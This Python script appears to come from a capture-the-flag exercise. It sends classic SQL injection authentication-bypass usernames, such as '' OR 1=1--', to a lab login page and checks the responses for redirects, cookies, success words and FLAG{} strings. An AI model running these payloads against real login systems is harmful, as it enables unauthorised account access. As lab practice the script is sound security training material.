import requests
import re
from urllib.parse import urlparse

# Target login endpoint
base_url = "http://challenge.local"
login_endpoint = f"{base_url}/login"

# Test payloads
test_cases = [
    {
        "name": "Normal failed login (baseline)",
        "username": "test",
        "password": "test"
    },
    {
        "name": "admin'-- (comment out password)",
        "username": "admin'--",
        "password": "test"
    },
    {
        "name": "' OR 1=1-- (classic SQLi)",
        "username": "' OR 1=1--",
        "password": "test"
    },
    {
        "name": "admin' OR '1'='1'-- (always true)",
        "username": "admin' OR '1'='1'--",
        "password": "test"
    }
]

print("=" * 80)
print("SQL INJECTION TESTING WITH REDIRECT FOLLOWING")
print("=" * 80)

results = []

for i, test in enumerate(test_cases, 1):
    print(f"\n[TEST {i}] {test['name']}")
    print(f"Username: {test['username']}")
    print(f"Password: {test['password']}")
    print("-" * 80)
    
    try:
        # Send POST request with redirect following
        response = requests.post(
            login_endpoint,
            data={
                "username": test['username'],
                "password": test['password']
            },
            allow_redirects=True,  # Follow redirects
            timeout=10
        )
        
        # Capture final URL after redirects
        final_url = response.url
        redirect_occurred = final_url != login_endpoint
        
        print(f"[+] Initial URL: {login_endpoint}")
        print(f"[+] Final URL: {final_url}")
        print(f"[+] Redirect occurred: {redirect_occurred}")
        print(f"[+] Final status code: {response.status_code}")
        print(f"[+] Response length: {len(response.content)} bytes")
        
        # Check for Set-Cookie headers
        if response.cookies:
            print(f"[+] Cookies set: {dict(response.cookies)}")
            for cookie_name, cookie_value in response.cookies.items():
                print(f"    {cookie_name} = {cookie_value}")
        else:
            print("[+] No cookies set")
        
        # Check response headers
        if 'Set-Cookie' in response.headers:
            print(f"[+] Set-Cookie header: {response.headers['Set-Cookie']}")
        
        # Search for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        if flag_matches:
            print(f"[!] FLAG FOUND: {flag_matches}")
        else:
            print("[-] No FLAG{} pattern found")
        
        # Check for success indicators
        success_indicators = ["dashboard", "welcome back", "logout", "welcome,", "logged in"]
        found_indicators = []
        for indicator in success_indicators:
            if indicator.lower() in response.text.lower():
                found_indicators.append(indicator)
        
        if found_indicators:
            print(f"[+] Success indicators found: {found_indicators}")
        else:
            print("[-] No success indicators found")
        
        # Check for failure indicators
        failure_indicators = ["invalid", "incorrect", "failed", "error", "wrong"]
        found_failures = []
        for indicator in failure_indicators:
            if indicator.lower() in response.text.lower():
                found_failures.append(indicator)
        
        if found_failures:
            print(f"[-] Failure indicators found: {found_failures}")
        
        # Store results for comparison
        results.append({
            "test": test['name'],
            "username": test['username'],
            "final_url": final_url,
            "redirected": redirect_occurred,
            "status": response.status_code,
            "length": len(response.content),
            "cookies": dict(response.cookies) if response.cookies else None,
            "flags": flag_matches,
            "success_indicators": found_indicators,
            "failure_indicators": found_failures,
            "response_text": response.text
        })
        
        # Print response body (first 1000 chars for analysis)
        print(f"\n[+] Response body preview (first 1000 chars):")
        print(response.text[:1000])
        if len(response.text) > 1000:
            print(f"... (truncated, total length: {len(response.text)} chars)")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        results.append({
            "test": test['name'],
            "username": test['username'],
            "error": str(e)
        })

# Comparative analysis
print("\n" + "=" * 80)
print("COMPARATIVE ANALYSIS")
print("=" * 80)

# Compare response lengths
print("\n[*] Response Length Comparison:")
for result in results:
    if 'length' in result:
        print(f"  {result['test']}: {result['length']} bytes")

# Compare final URLs
print("\n[*] Final URL Comparison:")
for result in results:
    if 'final_url' in result:
        redirected_marker = " (REDIRECTED)" if result['redirected'] else ""
        print(f"  {result['test']}: {result['final_url']}{redirected_marker}")

# Compare cookies
print("\n[*] Cookies Comparison:")
for result in results:
    if 'cookies' in result:
        if result['cookies']:
            print(f"  {result['test']}: {result['cookies']}")
        else:
            print(f"  {result['test']}: No cookies")

# Identify anomalies
print("\n[*] Anomaly Detection:")
baseline_length = results[0]['length'] if 'length' in results[0] else 0
for result in results:
    if 'length' in result and result['length'] != baseline_length:
        print(f"  [!] ANOMALY: {result['test']} has different response length ({result['length']} vs {baseline_length})")
    if 'redirected' in result and result['redirected']:
        print(f"  [!] ANOMALY: {result['test']} caused redirect to {result['final_url']}")
    if 'cookies' in result and result['cookies']:
        print(f"  [!] ANOMALY: {result['test']} set cookies: {result['cookies']}")
    if result.get('success_indicators'):
        print(f"  [!] ANOMALY: {result['test']} shows success indicators: {result['success_indicators']}")
    if result.get('flags'):
        print(f"  [!] FLAG: {result['test']} contains FLAG: {result['flags']}")

print("\n" + "=" * 80)
print("TESTING COMPLETE")
print("=" * 80)

